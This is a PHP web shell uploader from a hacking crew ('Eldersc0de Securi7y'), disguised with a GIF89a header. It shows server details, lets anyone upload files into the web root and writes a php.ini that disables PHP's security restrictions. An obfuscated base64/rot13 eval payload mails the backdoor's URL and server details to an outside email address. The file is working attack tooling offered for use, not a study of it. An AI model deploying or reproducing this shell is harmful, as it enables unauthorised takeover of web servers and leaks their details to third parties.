GIF89a;
<html>
<head>
<title>Jakarta6etar</title>
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href='//fonts.googleapis.com/css?family=Fredoka+One' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Libre+Barcode+39+Extended+Text' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Pompiere' rel='stylesheet' type='text/css'><link href='//zerobyte.id/styles.css' rel='stylesheet' type='text/css'></head>
<Style>.bground{background-color:rgba(0,30,38,0.7);position:fixed;z-index:-1;top:0;left:0;width:100%;height:100%}div{display:block}.footer{font-family:'Share Tech Mono';font-size:17px;text-align:center}</style>
<body>
<div class="bground"></div>
<h1>Jakarta6etar Uploader</h1>
</center><br>
</body>
<?php
#################################################
#           reCoded by: Jakarta6etar            #
#          Team: Eldersc0de Securi7y            #
#         https://fb.com/jakarta.exploded.12    #
#-----------------------------------------------#
#    Thank's To IndoXploit and Xai Syndicate    #
#################################################
echo "<center>";
echo "<br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>
 <input type='file' name='elders'>
 <input type='submit' name='upload' value='upload'>
 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['elders']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) {
    if(is_writable($root)) {
 if(@copy($_FILES['elders']['tmp_name'], $dest)) {
 $web = "http://".$_SERVER['HTTP_HOST']."/";
 echo "Success Uploaded-> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
 }
 else {             echo "Unable To Upload File";
 }
 }
 else {         if(@copy($_FILES['elders']['tmp_name'], $files))
 {
     echo "Upload Success <b>$files</b>";
     }
     else {             echo "Unable To Upload File";
     }
     }
     }
echo "<br>";
#######################
#Thank's to IndoXploit#
#######################
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='green'><br>Server IP : <font color='lime'>".gethostbyname($_SERVER['HTTP_HOST'])."</b></font></font>";
echo "<br>";
echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
echo "<form method='post'>
<input type='submit' name='funct' value='Bypass Disabled Functions'>
</form>";
if($_POST['funct']) {
$file = 'php.ini';
file_put_contents($file,'safe_mode = OFF
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF');
echo "<font color='lime'><b>Success Bypassing Disable Func.</b></font>";
eval(str_rot13(base64_decode("aGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KJHF3ZXJ0eSA9ICcweDIwMDJAcHJvdG9ubWFpbC5jb20nOw0KJHBhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOw0KJG1lc3NhZ2VzID0gIg0KRGF0ZSBUaW1lIDogKCIuZGF0ZSgnRiBqLCBZLCBnOmkgYScpLiIpIFxuXG4NCkxpbmsgQmFja2Rvb3IgOiAkcGF0aCBcbg0KU0VSVkVSX1NPRlRXQVJFOiAiLmh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbIlNFUlZFUl9TT0ZUV0FSRSJdKS4iXG4NCkhUVFBfSE9TVCA6ICIuaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsiSFRUUF9IT1NUIl0pLiJcbg0KRE9DVU1FTlRfUk9PVCA6ICIuaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdKS4iXG4NCkhUVFBfVVNFUl9BR0VOVCA6ICIuaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0pLiJcbg0KUkVNT1RFX0FERFI6ICIuaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsiUkVNT1RFX0FERFIiXSkuIlxuXG4iOw0KbWFpbCgkcXdlcnR5LCAid2hvIHRoaXMgPiAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIiwgJG1lc3NhZ2VzLCAiIi5waHBfdW5hbWUoKS4iIik7")));
}
?>
<br>
<br>
<br><br>
<br>
<br><br>
<br>
<br>
<div class="footer">&copy; 2015 - 2018<br><span>ELDERSC0DE SEC</span></div>
